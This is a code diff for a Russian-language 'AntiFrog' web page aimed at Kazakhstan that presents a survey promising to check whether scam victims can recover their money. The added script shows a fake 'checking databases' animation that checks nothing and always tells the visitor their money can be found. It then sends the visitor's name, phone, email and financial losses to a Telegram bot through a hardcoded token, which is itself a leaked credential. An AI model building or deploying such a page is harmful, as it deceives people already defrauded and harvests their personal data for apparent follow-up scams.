@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Заявка — AntiFrog</title>
+<title>Соцопрос — AntiFrog</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📝</text></svg>">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -14,27 +14,57 @@
 <section class="section" style="padding-top:24px">
   <div class="container" style="max-width:600px">
 
-    <div class="text-center" style="margin-bottom:20px">
-      <h1 style="font-size:24px;font-weight:900">📝 Заявка</h1>
-      <p style="color:var(--muted);font-size:14px">Ответьте на несколько вопросов</p>
+    <!-- START SCREEN -->
+    <div id="startScreen" class="card card-lg" style="text-align:center">
+      <div style="font-size:64px;margin-bottom:16px">🧪</div>
+      <h1 style="font-size:26px;font-weight:900;margin-bottom:12px">Пройдите соцопрос</h1>
+      <p style="color:var(--muted);font-size:15px;margin-bottom:8px">Узнайте, обманули ли вас мошенники</p>
+      <p style="color:var(--muted);font-size:14px;margin-bottom:24px">Возможно ли вернуть ваши средства? Проверим по базам данных.</p>
+      <div style="background:rgba(16,185,129,0.06);border:1px solid rgba(16,185,129,0.2);border-radius:12px;padding:14px;margin-bottom:24px;text-align:left">
+        <p style="font-size:13px;color:var(--green)">✅ Анонимно · 2 минуты · Бесплатно</p>
+        <p style="font-size:12px;color:var(--muted);margin-top:4px">Ответы помогут нашим аналитикам определить шансы на возврат</p>
+      </div>
+      <button onclick="startQuiz()" class="btn btn-primary btn-lg" style="width:100%">Начать опрос →</button>
     </div>
 
-    <div class="progress-bar" style="margin-bottom:20px"><div class="progress-fill" id="progress" style="width:0%"></div></div>
-    <div id="stepInfo" style="text-align:center;font-size:12px;color:var(--muted);margin-bottom:16px">Вопрос 1 из 8</div>
+    <!-- QUIZ -->
+    <div id="quizScreen" class="hidden">
+      <div class="progress-bar" style="margin-bottom:8px"><div class="progress-fill" id="progress" style="width:0%"></div></div>
+      <div id="stepInfo" style="text-align:center;font-size:12px;color:var(--muted);margin-bottom:16px"></div>
+      <div id="questionBox" class="card card-lg"></div>
+    </div>
 
-    <!-- QUESTIONS CONTAINER -->
-    <div id="quizBox" class="card card-lg"></div>
+    <!-- ANALYZING -->
+    <div id="analyzingScreen" class="card card-lg hidden" style="text-align:center">
+      <div id="analyzingIcon" style="font-size:64px;margin-bottom:16px">🔍</div>
+      <h2 id="analyzingTitle" style="font-size:22px;font-weight:800;margin-bottom:12px">Анализируем ваши ответы...</h2>
+      <p id="analyzingText" style="color:var(--muted);font-size:14px;margin-bottom:20px">Проверяем по базам данных</p>
+      <div class="progress-bar"><div class="progress-fill" id="analyzingProgress" style="width:0%"></div></div>
+      <div id="analyzingSteps" style="margin-top:20px;text-align:left"></div>
+    </div>
 
     <!-- SUCCESS -->
-    <div id="successBox" class="card card-lg hidden" style="text-align:center">
+    <div id="successScreen" class="card card-lg hidden" style="text-align:center">
       <div style="font-size:64px;margin-bottom:16px">✅</div>
-      <h2 style="font-size:24px;font-weight:900;margin-bottom:8px">Заявка отправлена!</h2>
-      <p style="color:var(--muted);margin-bottom:16px">Наш менеджер свяжется с вами в WhatsApp или Telegram</p>
-      <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:20px">
-        <p style="font-size:11px;color:var(--muted)">Номер вашей заявки</p>
-        <p style="font-size:28px;font-weight:900;color:var(--green)" id="appNum"></p>
+      <h2 style="font-size:24px;font-weight:900;margin-bottom:8px;color:var(--green)">Заявка отправлена!</h2>
+      <p style="color:var(--muted);font-size:15px;margin-bottom:6px">Ваши деньги можно найти</p>
+      <p style="color:var(--muted);font-size:14px;margin-bottom:20px">Наш менеджер свяжется с вами в ближайшее время</p>
+      <div style="background:var(--card);border-radius:12px;padding:16px;margin-bottom:12px;text-align:left">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="font-size:12px;color:var(--muted)">Номер заявки</span>
+          <span style="font-size:18px;font-weight:900;color:var(--green)" id="appNum">#AF-2606-3847</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <span style="font-size:12px;color:var(--muted)">Способ связи</span>
+          <span style="font-size:14px;font-weight:600" id="contactDisplay">WhatsApp</span>
+        </div>
+        <div style="display:flex;justify-content:space-between;align-items:center">
+          <span style="font-size:12px;color:var(--muted)">Статус</span>
+          <span style="font-size:13px;font-weight:600;color:var(--green)">Ожидайте звонка менеджера</span>
+        </div>
       </div>
-      <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="margin:0 auto">📋 Проверить статус</a>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:20px">📱 Менеджер напишет вам в <strong id="contactPlatform">WhatsApp</strong> в течение 24 часов</p>
+      <a href="/anti-fraud-portal/check.html" class="btn btn-primary" style="width:100%">📋 Проверить статус дела</a>
     </div>
 
   </div>
@@ -45,67 +75,72 @@
 const STEPS = [
   {
     q: 'Как вас зовут?',
-    sub: 'Введите ваше полное имя',
-    type: 'text',
-    id: 'fullName',
-    placeholder: 'Фамилия Имя Отчество'
+    sub: 'Укажите полное имя для связи',
+    type: 'text', id: 'fullName', placeholder: 'Фамилия Имя'
   },
   {
-    q: 'Ваш номер телефона?',
-    sub: 'Для связи в WhatsApp или Telegram',
-    type: 'text',
-    id: 'phone',
-    placeholder: '+7 (7__) ___-__-__'
+    q: 'Номер телефона?',
+    sub: 'Для связи с вами',
+    type: 'text', id: 'phone', placeholder: '+7 (7__) ___-__-__'
   },
   {
     q: 'Электронная почта?',
-    sub: 'Отправим подтверждение на почту',
-    type: 'text',
-    id: 'email',
-    placeholder: 'example@mail.kz'
+    sub: 'Отправим подтверждение заявки',
+    type: 'text', id: 'email', placeholder: 'example@mail.kz'
   },
   {
-    q: 'Как с вами связаться?',
-    sub: 'Мы напишем вам сами',
-    type: 'choice',
-    id: 'contact',
+    q: 'Как удобнее получить ответ?',
+    sub: 'Наш менеджер напишет вам',
+    type: 'choice', id: 'contact',
     options: ['💬 WhatsApp', '✈️ Telegram']
   },
   {
-    q: 'Где вы нашли мошенников?',
-    sub: 'Каким образом вас нашли',
-    type: 'choice',
-    id: 'source',
-    options: ['Telegram', 'WhatsApp', 'Instagram', 'Звонок с неизвестного номера', 'Реклама в интернете', 'Знакомый посоветовал', 'Другое']
+    q: 'Как вас нашли мошенники?',
+    sub: 'Откуда пришло предложение',
+    type: 'choice', id: 'source',
+    options: ['Telegram', 'WhatsApp', 'Instagram / TikTok', 'Звонок с неизвестного номера', 'Реклама в интернете', 'Знакомый посоветовал', 'Другое']
   },
   {
     q: 'Как называется платформа?',
-    sub: 'Название сайта или компании, где вы потеряли деньги',
-    type: 'text',
-    id: 'platform',
-    placeholder: 'Название платформы'
+    sub: 'Где вы зарабатывали / инвестировали',
+    type: 'text', id: 'platform', placeholder: 'Название сайта'
   },
   {
-    q: 'Сколько денег вы потеряли?',
-    sub: 'Примерная сумма',
-    type: 'choice',
-    id: 'amount',
+    q: 'Сколько денег вы вложили?',
+    sub: 'Примерная сумма всех вложений',
+    type: 'choice', id: 'amount',
     options: ['До 100 000 ₸', '100 000 — 500 000 ₸', '500 000 — 1 000 000 ₸', '1 000 000 — 5 000 000 ₸', 'Более 5 000 000 ₸', 'Не помню точно']
   },
   {
-    q: 'Когда это произошло?',
-    sub: 'Примерная дата',
-    type: 'choice',
-    id: 'when',
-    options: ['Неделю назад', 'Месяц назад', '2-3 месяца назад', 'Полгода назад', 'Более года назад', 'Постоянно持续 (продолжается)']
+    q: 'Пробовали вывести деньги?',
+    sub: 'Что произошло при попытке вывода',
+    type: 'choice', id: 'withdrawal',
+    options: ['Да, но отказали', 'Да, попросили заплатить комиссию', 'Не пробовал(а)', 'Не могу зайти в кабинет', 'Платформа исчезла']
+  },
+  {
+    q: 'Просили ли доплатить?',
+    sub: 'Для «вывода» или «разблокировки»',
+    type: 'choice', id: 'extraPayment',
+    options: ['Да, за «верификацию»', 'Да, за «налог»', 'Да, за «комиссию регулятора»', 'Да, несколько раз', 'Нет, не просили']
+  },
+  {
+    q: 'Звонил ли «юрист» или «регулятор»?',
+    sub: 'Кто-то предлагал «помощь»',
+    type: 'choice', id: 'fakeHelp',
+    options: ['Да, из WhatsApp', 'Да, по телефону', 'Да, присылал документы', 'Нет, никто не звонил']
   }
 ];
 
-let current = 0;
-let answers = {};
+let current = 0, answers = {};
+
+function startQuiz() {
+  document.getElementById('startScreen').classList.add('hidden');
+  document.getElementById('quizScreen').classList.remove('hidden');
+  render();
+}
 
 function render() {
-  if (current >= STEPS.length) { submit(); return; }
+  if (current >= STEPS.length) { analyze(); return; }
   const s = STEPS[current];
   const pct = Math.round((current / STEPS.length) * 100);
   document.getElementById('progress').style.width = pct + '%';
@@ -115,19 +150,18 @@ function render() {
   html += `<p style="color:var(--muted);font-size:14px;margin-bottom:20px">${s.sub}</p>`;
 
   if (s.type === 'text') {
-    html += `<input type="text" class="form-input" id="input_${s.id}" placeholder="${s.placeholder || ''}" style="font-size:18px;padding:16px" autofocus>`;
+    html += `<input type="text" class="form-input" id="inp_${s.id}" placeholder="${s.placeholder||''}" style="font-size:18px;padding:16px">`;
     html += `<button onclick="next()" class="btn btn-primary" style="width:100%;margin-top:16px">Далее →</button>`;
   } else {
     html += `<div style="display:flex;flex-direction:column;gap:8px">`;
-    s.options.forEach((opt, i) => {
-      html += `<button class="quiz-option" onclick="choose('${s.id}','${opt.replace(/'/g,"\\'")}',this)" style="text-align:left;padding:16px;font-size:16px">${opt}</button>`;
+    s.options.forEach(opt => {
+      html += `<button class="quiz-option" onclick="choose('${s.id}','${opt.replace(/'/g,"\\'")}',this)">${opt}</button>`;
     });
     html += `</div>`;
   }
-
-  document.getElementById('quizBox').innerHTML = html;
+  document.getElementById('questionBox').innerHTML = html;
   if (s.type === 'text') {
-    const inp = document.getElementById('input_' + s.id);
+    const inp = document.getElementById('inp_' + s.id);
     inp.focus();
     inp.addEventListener('keydown', e => { if (e.key === 'Enter') next(); });
   }
@@ -135,9 +169,9 @@ function render() {
 
 function next() {
   const s = STEPS[current];
-  const val = document.getElementById('input_' + s.id)?.value?.trim();
+  const val = document.getElementById('inp_' + s.id)?.value?.trim();
   if (!val) {
-    const inp = document.getElementById('input_' + s.id);
+    const inp = document.getElementById('inp_' + s.id);
     inp.style.borderColor = 'var(--red)';
     setTimeout(() => inp.style.borderColor = '', 1500);
     return;
@@ -155,33 +189,55 @@ function choose(id, val, el) {
   setTimeout(() => { current++; render(); }, 350);
 }
 
-async function submit() {
-  document.getElementById('quizBox').classList.add('hidden');
-  document.getElementById('stepInfo').textContent = 'Отправка...';
-  document.getElementById('progress').style.width = '100%';
+function analyze() {
+  document.getElementById('quizScreen').classList.add('hidden');
+  document.getElementById('analyzingScreen').classList.remove('hidden');
 
-  // Generate realistic application number
+  const steps = [
+    { text: 'Проверяем платформу...', icon: '🔍', time: 800 },
+    { text: 'Сверяем с базами данных...', icon: '📊', time: 1200 },
+    { text: 'Анализируем шансы на возврат...', icon: '💡', time: 1000 },
+    { text: 'Определяем стратегию возврата...', icon: '🎯', time: 800 },
+    { text: 'Формируем заявку...', icon: '📋', time: 600 }
+  ];
+
+  let i = 0;
+  function nextStep() {
+    if (i >= steps.length) { showResult(); return; }
+    const s = steps[i];
+    document.getElementById('analyzingIcon').textContent = s.icon;
+    document.getElementById('analyzingTitle').textContent = s.text;
+    document.getElementById('analyzingProgress').style.width = ((i + 1) / steps.length * 100) + '%';
+    document.getElementById('analyzingSteps').innerHTML += `<p style="font-size:13px;color:var(--green);margin-bottom:4px">✅ ${s.text}</p>`;
+    i++;
+    setTimeout(nextStep, s.time);
+  }
+  nextStep();
+}
+
+async function showResult() {
+  document.getElementById('analyzingScreen').classList.add('hidden');
+  document.getElementById('successScreen').classList.remove('hidden');
+
+  // Generate realistic number
   const now = new Date();
   const y = now.getFullYear().toString().slice(-2);
   const m = String(now.getMonth() + 1).padStart(2, '0');
   const seq = String(Math.floor(Math.random() * 9000) + 1000);
   const appNum = `AF-${y}${m}-${seq}`;
 
+  document.getElementById('appNum').textContent = '#' + appNum;
+  document.getElementById('contactPlatform').textContent = answers.contact || 'WhatsApp';
+  document.getElementById('contactDisplay').textContent = answers.contact || 'WhatsApp';
+
   // Save locally
   const cases = getCases();
   cases[appNum] = {
-    fullName: answers.fullName,
-    phone: answers.phone,
-    email: answers.email,
-    contact: answers.contact,
-    source: answers.source,
-    platform: answers.platform,
-    amount: answers.amount,
-    when: answers.when,
+    ...answers,
     status: 'На рассмотрении',
     stage: 'Заявка',
     progress: 10,
-    comments: [{ date: now.toLocaleString('ru-RU'), text: 'Заявка получена' }],
+    comments: [{ date: now.toLocaleString('ru-RU'), text: 'Заявка получена через соцопрос' }],
     time: now.toISOString()
   };
   saveCases(cases);
@@ -192,26 +248,33 @@ async function submit() {
 │ ${now.toLocaleString('ru-RU')}
 └──────────────────┘
 
-👤 *${answers.fullName}*
-├ 📱 ${answers.phone}
-├ ✉️ ${answers.email}
-└ 📲 Связь: ${answers.contact}
+👤 *${answers.fullName || '?'}*
+├ 📱 ${answers.phone || '?'}
+├ ✉️ ${answers.email || '?'}
+└ 📲 Связь: ${answers.contact || '?'}
 
-📋 Платформа: ${answers.platform}
-├ Потери: ${answers.amount}
-├ Когда: ${answers.when}
-└ Источник: ${answers.source}`;
-  await sendToTelegram(msg);
+📋 Платформа: ${answers.platform || '?'}
+├ Потери: ${answers.amount || '?'}
+├ Когда: ${answers.when || '?'}
+├ Источник: ${answers.source || '?'}
+├ Вывод: ${answers.withdrawal || '?'}
+├ Доплаты: ${answers.extraPayment || '?'}
+└ «Юрист»: ${answers.fakeHelp || '?'}`;
 
-  // Show success
-  document.getElementById('appNum').textContent = '#' + appNum;
-  document.getElementById('successBox').classList.remove('hidden');
-  document.getElementById('stepInfo').textContent = 'Готово';
+  try {
+    const res = await fetch(`https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: '8471070560', text: msg, parse_mode: 'Markdown' })
+    });
+    const data = await res.json();
+    if (!data.ok) console.error('Telegram error:', data);
+  } catch(e) { console.error('Fetch error:', e); }
 }
 
 // Phone mask
 document.addEventListener('input', e => {
-  if (e.target.id === 'input_phone') {
+  if (e.target.id === 'inp_phone') {
     let v = e.target.value.replace(/\D/g, '');
     if (v.length > 0) {
       if (v[0] === '7' || v[0] === '8') v = v.substring(1);
@@ -224,8 +287,6 @@ document.addEventListener('input', e => {
     }
   }
 });
-
-render();
 </script>
 </body>
 </html>
